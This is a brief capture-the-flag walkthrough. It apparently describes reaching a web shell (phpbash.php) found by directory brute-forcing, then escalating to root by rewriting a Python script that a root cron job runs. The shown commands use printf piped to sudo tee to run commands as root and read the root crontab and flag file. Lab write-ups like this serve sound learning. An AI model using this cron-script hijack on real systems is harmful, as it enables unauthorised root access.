## User
Found **/dev** direcotry with drib common.txt list

In there was **phpbash.php** and **phpbash.min.php** giving me access to the system as **www-data** 

## Root
Used **sudo -l** to get more information with. This revealed that **www-data** is able to **sudo -u** as scriptmanager. **scriptmanager** had access to **/scripts/**. 

There was a **test.py** file and a **test.txt** file. **test.txt** was owened by root and **test.py** was owned by **scriptmanager** and the python script was writing some text into **test.txt**, which meant that **test.py** is getting executed by root.

**printf "import os\nos.system(\"whoami > /scripts/test.txt\")" | sudo -u scriptmanager tee /scripts/test.py** showed that the script was getting executed by root continually, which was most likely done by a cronjob.

**printf "import os\nos.system(\"crontab -l -u root > /scripts/test.txt\")" | sudo -u scriptmanager tee /scripts/test.py** proved this theory, as there was a cronjob that exexuts the python script:
```bash
* * * * * cd /scripts; for f in *.py; do python "$f"; done
```

**printf "import os\nos.system(\"cat /root/root.txt> /scripts/test.txt\")" | sudo -u scriptmanager tee /scripts/test.py** provided the root flag,
